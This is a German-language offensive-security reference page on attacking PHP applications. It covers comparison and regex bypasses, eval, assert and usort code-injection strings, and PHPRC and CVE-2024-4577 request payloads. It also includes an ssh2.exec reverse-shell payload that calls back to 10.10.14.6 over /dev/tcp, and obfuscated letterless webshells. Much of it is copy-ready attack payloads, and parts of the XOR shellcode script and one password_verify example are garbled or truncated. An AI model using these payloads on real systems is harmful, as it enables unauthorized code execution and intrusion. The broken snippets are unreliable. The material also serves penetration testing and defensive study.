# PHP Tricks

{{#include ../../../banners/hacktricks-training.md}}

## Häufige Speicherorte für Cookies:

Dies gilt auch für phpMyAdmin-Cookies.

Cookies:
```
PHPSESSID
phpMyAdmin
```
Standorte:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## PHP-Vergleiche umgehen

### Lockere Vergleiche/Type Juggling ( == )

Wenn in PHP `==` verwendet wird, gibt es unerwartete Fälle, in denen der Vergleich nicht wie erwartet funktioniert. Das liegt daran, dass `==` nur Werte vergleicht, die in denselben Typ konvertiert wurden; wenn du außerdem sicherstellen möchtest, dass der Typ der verglichenen Daten gleich ist, musst du `===` verwenden.

PHP-Vergleichstabellen: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../images/image (567).png>)

{{#file}}
EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf
{{#endfile}}

- `"string" == 0 -> True` Ein String, der nicht mit einer Zahl beginnt, ist gleich einer Zahl
- `"0xAAAA" == "43690" -> True` Strings, die aus Zahlen im Dezimal- oder Hex-Format bestehen, können mit anderen Zahlen/Strings verglichen werden und True ergeben, wenn die Zahlen gleich sind (Zahlen in einem String werden als Zahlen interpretiert)
- `"0e3264578" == 0 --> True` Ein String, der mit "0e" beginnt und von beliebigem Inhalt gefolgt wird, ist gleich 0
- `"0X3264578" == 0X --> True` Ein String, der mit "0" beginnt und danach einen Buchstaben (X kann jeder Buchstabe sein) und beliebigen weiteren Inhalt hat, ist gleich 0
- `"0e12334" == "0" --> True` Das ist sehr interessant, denn in manchen Fällen kannst du die String-Eingabe von "0" und Inhalte, die gehasht und damit verglichen werden, kontrollieren. Wenn du also einen Wert liefern kannst, dessen Hash mit "0e" beginnt und keine Buchstaben enthält, könntest du den Vergleich umgehen. Bereits gehashte Strings dieses Formats findest du hier: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
- `"X" == 0 --> True` Jeder Buchstabe in einem String entspricht dem int-Wert 0

Mehr Infos in [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09]

### **in_array()**

**Type Juggling** beeinflusst auch die Funktion `in_array()` standardmäßig (du musst das dritte Argument auf true setzen, um einen strikten Vergleich zu erzwingen):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Wenn diese Funktion für **jede Authentifizierungsprüfung** (z. B. die Überprüfung des Passworts) verwendet wird und der Benutzer eine Seite des Vergleichs kontrolliert, kann er ein leeres Array anstelle eines Strings als Wert des Passworts senden (`https://example.com/login.php/?username=admin&password[]=`) und diese Prüfung umgehen:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
Der gleiche Fehler tritt bei `strcasecmp()` auf

### Striktes Type Juggling

Auch wenn `===` **verwendet wird**, können Fehler auftreten, die den **Vergleich anfällig** für **type juggling** machen. Zum Beispiel, wenn der Vergleich die Daten **vor dem Vergleichen in einen anderen Objekttyp konvertiert**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg_match(/^.\*/)

**`preg_match()`** kann verwendet werden, um **validate user input** (es **prüft**, ob irgendein **word/regex** aus einer **blacklist** im **user input** **vorhanden** ist, und falls nicht, kann der Code seine Ausführung fortsetzen).

#### New line bypass

Allerdings, beim Abgrenzen des Anfangs des regexp prüft `preg_match()` **nur die erste Zeile des user input**, daher, wenn du es schaffst, die Eingabe in **mehreren Zeilen** zu **senden**, kannst du diese Prüfung umgehen. Beispiel:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Um diese Prüfung zu umgehen, könntest du **den Wert mit Zeilenumbrüchen urlencoded senden** (`%0A`) oder, wenn du **JSON data** senden kannst, sende es in **mehreren Zeilen**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Find an example here: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Length error bypass**

(Der bypass wurde offenbar auf PHP 5.2.5 ausprobiert und ich konnte ihn auf PHP 7.3.15 nicht zum Laufen bringen)\
Wenn du an `preg_match()` eine gültige, sehr **große Eingabe** schicken kannst, wird es sie **nicht verarbeiten können** und du wirst die Prüfung **bypass** können. Zum Beispiel, wenn ein JSON auf eine Blacklist gesetzt wird, könntest du folgendes senden:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
Quelle: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### ReDoS Bypass

Trick von: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) and [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../images/image (26).png" alt=""><figcaption></figcaption></figure>

Kurz gesagt entsteht das Problem, weil die `preg_*`-Funktionen in PHP auf der [PCRE library](http://www.pcre.org/) aufbauen. In PCRE werden bestimmte reguläre Ausdrücke durch viele rekursive Aufrufe abgeglichen, wodurch viel Stack-Speicher verbraucht wird. Es ist möglich, ein Limit für die erlaubten Rekursionen zu setzen, aber in PHP ist dieses Limit [defaults to 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), was mehr ist, als in den Stack passt.

[This Stackoverflow thread](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) wurde ebenfalls im Post verlinkt, wo das Problem ausführlicher besprochen wird. Unsere Aufgabe war nun klar:\\
**Sende eine Eingabe, die die regex zu 100_000+ Rekursionen zwingt, SIGSEGV verursacht, `preg_match()` `false` zurückgeben lässt, sodass die Anwendung denkt, unsere Eingabe sei nicht bösartig, und am Ende des Payloads etwas wie `{system(<verybadcommand>)}` versteckt, um SSTI --> RCE --> flag :)**.

Nun, in regex terms, machen wir nicht wirklich 100k "recursions", sondern zählen "backtracking steps", die laut der [PHP documentation](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) standardmäßig auf 1_000_000 (1M) in der Variable `pcre.backtrack_limit` gesetzt sind.\\
Um das zu erreichen, `'X'*500_001` führt zu 1 Million Backtracking-Schritten (500k vorwärts und 500k rückwärts):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Type Juggling für PHP obfuscation
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

Wenn PHP auf eine andere Seite weiterleitet, aber keine **`die`**- oder **`exit`**-Funktion **nach dem Setzen des Headers `Location`** aufgerufen wird, führt PHP die Ausführung fort und hängt die Daten an den Body an:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Path Traversal and File Inclusion Exploitation

Siehe:


{{#ref}}
../../../pentesting-web/file-inclusion/
{{#endref}}

## Weitere Tricks

- **register_globals**: In **PHP < 4.1.1.1** oder bei falscher Konfiguration kann **register_globals** aktiv sein (oder sein Verhalten nachgeahmt werden). Das bedeutet, dass in globalen Variablen wie $\_GET, wenn sie einen Wert haben z.B. $\_GET\["param"]="1234", darauf über **$param** zugegriffen werden kann. **Daher kannst du durch das Senden von HTTP-Parametern Variablen überschreiben**, die im Code verwendet werden.
- Die **PHPSESSION cookies of the same domain are stored in the same place**, deshalb kannst du, wenn innerhalb einer Domain **different cookies are used in different paths**, dafür sorgen, dass ein Pfad **accesses the cookie of the path** und damit den Wert des Cookies des anderen Pfads setzt.\
Auf diese Weise, wenn **both paths access a variable with the same name**, kannst du den **value of that variable in path1 apply to path2** erzwingen. Dann behandelt path2 die Variablen von path1 als gültig (indem du dem Cookie den Namen gibst, der ihm in path2 entspricht).
- Wenn du die **usernames** der Benutzer der Maschine hast, prüfe die Adresse: **/\~\<USERNAME>** um zu sehen, ob die php-Verzeichnisse aktiviert sind.
- Wenn eine php-Konfiguration **`register_argc_argv = On`** hat, werden Query-Parameter, die durch Leerzeichen getrennt sind, verwendet, um das Argument-Array **`array_keys($_SERVER['argv'])`** zu befüllen, als wären sie **arguments from the CLI**. Das ist interessant, denn wenn diese **setting is off**, ist der Wert des **args array will be `Null`**, wenn die Seite über das Web aufgerufen wird, da das args-Array dann nicht befüllt wird. Daher, wenn eine Webseite versucht zu prüfen, ob sie als Web- oder als CLI-Tool läuft mit einem Vergleich wie `if (empty($_SERVER['argv'])) {`, könnte ein Angreifer **parameters in the GET request like `?--configPath=/lalala`** senden und es wird denken, es läuft als CLI und möglicherweise diese Argumente parsen und verwenden. Mehr Infos in der [original writeup](https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms).
- [**LFI and RCE using php wrappers**](../../../pentesting-web/file-inclusion/index.html)

### password_hash/password_verify

Diese Funktionen werden typischerweise in PHP verwendet, um **Hashes aus Passwörtern zu erzeugen** und um zu **prüfen**, ob ein Passwort im Vergleich zu einem Hash korrekt ist.\
Die unterstützten Algorithmen sind: `PASSWORD_DEFAULT` und `PASSWORD_BCRYPT` (beginnt mit `$2y$`). Beachte, dass **PASSWORD_DEFAULT häufig dem PASSWORD_BCRYPT entspricht.** Und aktuell hat **PASSWORD_BCRYPT** eine **Eingabebegrenzung von 72 Bytes**. Daher werden beim Versuch, etwas zu hashen, das größer als 72 Bytes ist, mit diesem Algorithmus nur die ersten 72 B verwendet:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### Bypass von HTTP headers durch Ausnutzung von PHP errors

#### Fehler verursachen, nachdem headers gesetzt wurden

From [**this twitter thread**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A&s=19) kannst du sehen, dass das Senden von mehr als 1000 GET params oder 1000 POST params oder 20 Dateien dazu führt, dass PHOP keine headers in der response setzt.

Ermöglicht z. B. das Umgehen von CSP headers, die in Code wie:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### Einen Body füllen, bevor Header gesetzt werden

Wenn eine **PHP-Seite Fehler ausgibt und vom Benutzer bereitgestellte Eingaben zurückgibt**, kann der Benutzer den PHP-Server dazu bringen, so viel Inhalt zurückzugeben, dass beim Versuch, die **Header** in die Antwort einzufügen, der Server einen Fehler wirft.\
Im folgenden Szenario hat der **Angreifer den Server große Fehler werfen lassen**, und wie im Screenshot zu sehen ist, konnte php beim Versuch, die **Header-Informationen zu ändern, nicht** (z. B. wurde der CSP header nicht an den Benutzer gesendet):

![](<../../../images/image (1085).png>)

## SSRF in PHP-Funktionen

Siehe die Seite:


{{#ref}}
php-ssrf.md
{{#endref}}

## ssh2.exec stream wrapper RCE
When the `ssh2` extension is installed (`ssh2.so` visible under `/etc/php*/mods-available/`, `php -m`, or even an FTP-accessible `php8.1_conf/` directory), PHP registers `ssh2.*` wrappers that can be abused anywhere user input is concatenated into `fopen()/file_get_contents()` targets. An admin-only download helper such as:
```php
$wrapper = strpos($_GET['format'], '://') !== false ? $_GET['format'] : '';
$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
```
reicht aus, um shell commands über localhost SSH auszuführen:
```http
GET /download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1:22/ping%2010.10.14.6%20-c%201#
```
* Der Credential-Teil kann jedes leaked Systempasswort wiederverwenden (z. B. aus cracked bcrypt hashes).
* Das nachgestellte `#` kommentiert die serverseitige Endung (`files/<id>.zip`) aus, sodass nur dein Befehl ausgeführt wird.
* Blind RCE wird bestätigt, indem man den Egress mit `tcpdump -ni tun0 icmp` überwacht oder einen HTTP canary bereitstellt.

Ersetze den Befehl durch eine reverse shell payload, sobald bestätigt:
```http
format=ssh2.exec://yuri:mustang@127.0.0.1:22/bash%20-c%20'bash%20-i%20>&%20/dev/tcp/10.10.14.6/443%200>&1'#
```
Da alles innerhalb des PHP-Workers abläuft, stammt die TCP-Verbindung vom Ziel und erbt die Privilegien des injizierten Kontos (`yuri`, `eric` usw.).

## Code-Ausführung

**system("ls");**\
**\`ls\`;**\
**shell_exec("ls");**

[Check this for more useful PHP functions](php-useful-functions-disable_functions-open_basedir-bypass/index.html)

### **RCE via** **preg_replace()**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Um den Code im "replace"-Argument auszuführen, ist mindestens ein match erforderlich.\
Diese Option von preg_replace ist **seit PHP 5.5.0 veraltet.**

### **RCE via Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE über Assert()**

Diese Funktion in php erlaubt es dir, **Code auszuführen, der in einem String steht**, um **true oder false zurückzugeben** (und abhängig davon die Ausführung zu ändern). Normalerweise wird die Benutzervariable in der Mitte eines Strings eingefügt. Zum Beispiel:\
`assert("strpos($_GET['page']),'..') === false")` --> In diesem Fall, um **RCE** zu bekommen, könntest du:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Du musst die code **syntax** **brechen**, deine **payload** **hinzufügen**, und sie dann wieder **reparieren**. Du kannst **logische Operationen** wie **"and" oder "%26%26" oder "|"** verwenden. Beachte, dass "or", "||" nicht funktionieren, weil, wenn die erste Bedingung wahr ist, unsere payload nicht ausgeführt wird. Ebenso funktioniert ";" nicht, da unsere payload nicht ausgeführt wird.

**Andere Option** ist, der Zeichenkette die Ausführung des Befehls hinzuzufügen: `'.highlight_file('.passwd').'`

**Andere Option** (wenn du den internen Code hast) ist, eine Variable zu ändern, um die Ausführung zu verändern: `$file = "hola"`

### **RCE via usort()**

Diese Funktion wird verwendet, um ein Array von Elementen mithilfe einer bestimmten Funktion zu sortieren.\
Um diese Funktion auszunutzen:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
Du kannst auch **//** verwenden, um den Rest des Codes zu kommentieren.

Um die Anzahl der Klammern zu ermitteln, die du schließen musst:

- `?order=id;}//`: wir erhalten eine Fehlermeldung (`Parse error: syntax error, unexpected ';'`). Wahrscheinlich fehlen eine oder mehrere Klammern.
- `?order=id);}//`: wir bekommen eine **Warnung**. Das scheint richtig zu sein.
- `?order=id));}//`: wir erhalten eine Fehlermeldung (`Parse error: syntax error, unexpected ')' i`). Wahrscheinlich haben wir zu viele schließende Klammern.

### **RCE via .httaccess**

Wenn du eine **.htaccess** hochladen kannst, kannst du mehrere Dinge **konfigurieren** und sogar Code ausführen (z. B. konfigurieren, dass Dateien mit der Erweiterung .htaccess **ausgeführt** werden können).

Different .htaccess shells can be found [here](https://github.com/wireghoul/htshells)

### RCE via Env Variables

Wenn du eine Schwachstelle findest, die es dir erlaubt, **env variables in PHP zu verändern** (und eine weitere, um Dateien hochzuladen, obwohl sich das mit mehr Recherche vielleicht umgehen lässt), könntest du dieses Verhalten missbrauchen, um **RCE** zu erreichen.

- [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/index.html#ld_preload-and-ld_library_path): Diese Env-Variable ermöglicht es, beliebige Libraries beim Ausführen anderer Binaries zu laden (obwohl es in diesem Fall möglicherweise nicht funktioniert).
- **`PHPRC`** : Weist PHP an, **wo es seine Konfigurationsdatei finden soll**, die üblicherweise `php.ini` heißt. Wenn du deine eigene Konfigurationsdatei hochladen kannst, benutze `PHPRC`, um PHP darauf zu zeigen. Füge einen **`auto_prepend_file`**-Eintrag hinzu, der eine zweite hochgeladene Datei angibt. Diese zweite Datei enthält normalen **PHP code, welcher dann vom PHP-Runtime vor jedem anderen Code ausgeführt wird**.
1. Lade eine PHP-Datei hoch, die unseren shellcode enthält
2. Lade eine zweite Datei hoch, die eine **`auto_prepend_file`**-Direktive enthält, welche den PHP-Preprozessor anweist, die in Schritt 1 hochgeladene Datei auszuführen
3. Setze die Variable `PHPRC` auf die Datei, die wir in Schritt 2 hochgeladen haben.
- Mehr Infos zur Ausführung dieser Kette [**aus dem Originalbericht**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
- **PHPRC** - eine weitere Option
- Wenn du **keine Dateien hochladen kannst**, könntest du unter FreeBSD die "Datei" `/dev/fd/0` verwenden, die das **`stdin`** enthält, also den **Body** der an das `stdin` gesendeten Anfrage:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
- Oder um RCE zu erreichen, aktiviere **`allow_url_include`** und prependiere eine Datei mit **base64 PHP code**:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
- Technik [**aus diesem Bericht**](https://vulncheck.com/blog/juniper-cve-2023-36845).

### XAMPP CGI RCE - CVE-2024-4577

Der Webserver parst HTTP-Requests und übergibt sie an ein PHP-Skript, wobei eine Anfrage wie [`http://host/cgi.php?foo=bar`](http://host/cgi.php?foo=bar&ref=labs.watchtowr.com) als `php.exe cgi.php foo=bar` ausgeführt wird, was eine Parameter-Injektion erlaubt. Dadurch wäre es möglich, die folgenden Parameter zu injizieren, um den PHP-Code aus dem Body zu laden:
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
Außerdem ist es möglich, den "-" param mithilfe des 0xAD-Zeichens aufgrund der späteren Normalisierung von PHP zu injizieren. Siehe das exploit-Beispiel aus [**this post**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/):
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## PHP Sanitization bypass & Brain Fuck

[**In this post**](https://blog.redteam-pentesting.de/2024/moodle-rce/) ist es möglich, großartige Ideen zu finden, um einen brain fuck PHP-Code zu generieren, wobei nur sehr wenige Zeichen erlaubt sind.\
Zudem wird eine interessante Methode vorgeschlagen, Funktionen auszuführen, die es ihnen erlaubten, mehrere Checks zu bypassen:
```php
(1)->{system($_GET[chr(97)])}
```
## PHP statische Analyse

Prüfe, ob du Code in Aufrufe dieser Funktionen einfügen kannst (from [here](https://www.youtube.com/watch?v=SyWUsN0yHKI&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Wenn Sie eine PHP-Anwendung debuggen, können Sie das globale Fehlerausgeben in `/etc/php5/apache2/php.ini` aktivieren, indem Sie `display_errors = On` hinzufügen und apache neu starten: `sudo systemctl restart apache2`

### Deobfuskieren von PHP-Code

Sie können das **Web**[ **www.unphp.net**](http://www.unphp.net) **zum Deobfuskieren von PHP-Code verwenden.**

## PHP Wrappers & Protokolle

PHP Wrappers und Protokolle können es ermöglichen, Schreib- und Leseschutzmaßnahmen in einem System zu umgehen und es zu kompromittieren. Für [**weitere Informationen siehe diese Seite**](../../../pentesting-web/file-inclusion/index.html#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug unauthenticated RCE

Wenn Sie in der Ausgabe von `phpconfig()` sehen, dass **Xdebug** **aktiviert** ist, sollten Sie versuchen, RCE über [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit) zu erlangen.

## Variable variables
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE abusing new $\_GET\["a"]\($\_GET\["b"])

Wenn du auf einer Seite **ein neues Objekt einer beliebigen Klasse erstellen** kannst, könntest du RCE erlangen. Sieh dir die folgende Seite an, um zu erfahren, wie:


{{#ref}}
php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md
{{#endref}}

## PHP ohne Buchstaben ausführen

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Oktal verwenden
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR einfacher shell code

Laut [**this writeup** ](https://mgp25.com/ctf/Web-challenge/) ist es auf folgende Weise möglich, einen einfachen shell code zu erzeugen:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Also, wenn du **beliebiges PHP ohne Zahlen und Buchstaben ausführen kannst**, kannst du eine Anfrage wie die folgende senden, die diese Nutzlast missbraucht, um beliebiges PHP auszuführen:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Für eine ausführlichere Erklärung siehe [https://ctf-wiki.org/web/php/php/#preg_match](https://ctf-wiki.org/web/php/php/#preg_match)

### XOR Shellcode (inside eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl-ähnlich
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
## Referenzen
- [0xdf – HTB Era: abusing ssh2.exec stream wrappers](https://0xdf.gitlab.io/2025/11/29/htb-era.html)

{{#include ../../../banners/hacktricks-training.md}}
